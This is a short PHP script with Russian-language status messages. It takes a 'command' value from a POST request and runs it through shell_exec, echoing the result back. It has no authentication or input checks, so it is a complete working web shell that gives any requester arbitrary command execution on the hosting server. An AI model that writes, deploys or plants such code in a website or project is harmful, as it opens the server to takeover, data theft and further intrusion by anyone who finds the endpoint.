<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'] ?? '';

    if (!empty($command)) {
       
        $output = shell_exec($command);

       
        if ($output) {
            echo nl2br(htmlspecialchars($output));
        } else {
            echo "Команда выполнена, но нет вывода.";
        }
    } else {
        echo "Команда не указана.";
    }
} else {
    echo "Неверный метод запроса.";
}
?>
